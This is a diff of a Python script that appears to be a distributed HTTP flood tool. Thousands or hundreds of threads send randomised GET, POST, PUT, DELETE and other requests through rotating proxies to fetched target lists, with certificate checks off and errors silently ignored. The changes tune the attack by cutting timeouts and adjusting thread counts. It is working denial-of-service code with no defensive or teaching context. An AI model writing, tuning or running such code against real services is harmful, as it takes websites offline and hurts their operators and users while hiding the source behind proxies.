@@ -29,8 +29,7 @@ def randomint(n=15):
    return ''.join(random.choices(string.digits, k=n))
 
 def requester():
-    time.sleep(10)
-    print("run!")
+    time.sleep(5)
     global useragents
     global targets
     while True:
@@ -45,20 +44,19 @@ def requester():
             s.stream=True
             rdn = random.randint(1,7)
             if rdn == 1:
-                s.get(target,timeout=5,proxies={"http":proxy,"https":proxy},verify=False)
+                s.get(target,timeout=1,proxies={"http":proxy,"https":proxy},verify=False)
             if rdn == 2:
-                s.options(target,timeout=5,proxies={"http":proxy,"https":proxy},verify=False)
+                s.options(target,timeout=1,proxies={"http":proxy,"https":proxy},verify=False)
             if rdn == 3:
-                s.head(target,timeout=5,proxies={"http":proxy,"https":proxy},verify=False)
+                s.head(target,timeout=1,proxies={"http":proxy,"https":proxy},verify=False)
             if rdn == 4:
-                s.post(target,timeout=5,proxies={"http":proxy,"https":proxy},verify=False)
+                s.post(target,timeout=1,proxies={"http":proxy,"https":proxy},verify=False)
             if rdn == 5:
-                s.put(target,timeout=5,proxies={"http":proxy,"https":proxy},verify=False)
+                s.put(target,timeout=1,proxies={"http":proxy,"https":proxy},verify=False)
             if rdn == 6:
-                s.patch(target,timeout=5,proxies={"http":proxy,"https":proxy},verify=False)
+                s.patch(target,timeout=1,proxies={"http":proxy,"https":proxy},verify=False)
             if rdn == 7:
-                s.delete(target,timeout=5,proxies={"http":proxy,"https":proxy},verify=False)
-            print("ok")
+                s.delete(target,timeout=1,proxies={"http":proxy,"https":proxy},verify=False)
         except:pass
 
 def gettargets():
@@ -89,7 +87,7 @@ threading.Thread(target=proxyreloader).start()
 
 def thread_starter():
     threading.Thread(target=gettargets).start()
-    for _ in range(10000):
+    for _ in range(100):
         threading.Thread(target=requester).start()
 
 threading.Thread(target=thread_starter).start()
